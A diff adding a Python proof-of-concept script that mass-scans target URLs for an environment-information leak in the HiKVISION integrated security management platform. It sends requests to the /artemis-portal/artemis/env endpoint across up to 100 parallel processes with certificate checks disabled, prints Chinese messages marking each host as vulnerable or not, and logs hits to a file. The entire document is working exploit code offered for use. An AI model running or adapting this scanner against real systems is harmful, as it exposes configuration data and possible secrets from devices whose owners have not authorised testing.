@@ -1,0 +1,62 @@
+import requests,re,argparse,os,sys
+from multiprocessing import Pool
+requests.packages.urllib3.disable_warnings()
+
+
+def banner():
+    banner = '''
+      _                       _                                       _     _     _ 
+ | |                     | |                                     (_)   | |   (_)
+ | |__   __ _ _ __   __ _| | ____ _ _ __   __ _ _ ____      _____ _ ___| |__  _ 
+ | '_ \ / _` | '_ \ / _` | |/ / _` | '_ \ / _` | '_ \ \ /\ / / _ \ / __| '_ \| |
+ | | | | (_| | | | | (_| |   < (_| | | | | (_| | | | \ V  V /  __/ \__ \ | | | |
+ |_| |_|\__,_|_| |_|\__, |_|\_\__,_|_| |_|\__, |_| |_|\_/\_/ \___|_|___/_| |_|_|
+                     __/ |                 __/ |                                
+                    |___/                 |___/                                                             
+'''
+    print(banner)
+
+def main():
+    banner()
+
+    parser = argparse.ArgumentParser(description="HiKVISION综合安防管理平台env信息泄漏")
+
+    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
+    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
+
+    args = parser.parse_args()
+
+    # print(args.url,args.filr)
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list = []
+        with open(args.file,'r',encoding='utf-8')as fp:
+            for i in fp.readlines():
+                url_list.append(i.strip().replace('\n',''))
+        mp = Pool(100)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join
+    else:
+        print(f"Useag: \n\tpython:{sys.argv[0]} -h")
+
+def poc(target):
+    payload ='/artemis-portal/artemis/env'
+    url = target+payload
+    header = {
+        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36"
+    }
+    res = requests.get(url=url,headers=header,verify=False,timeout=10)
+    # print(res.text)
+    try:
+        if res.status_code == 200 and 'profiles' in res.text:
+            print(f"[+]此url{target}存在漏洞")
+            with open('refult.txt','a',encoding='utf-8')as f:
+                f.write(target+'\n')
+        else:
+            print(f"[-]此url{target}不存在漏洞")
+    except Exception as e:
+        print(f"[*]该url{target}可能存在访问问题，请手工测试")
+if __name__ == '__main__':
+    main()
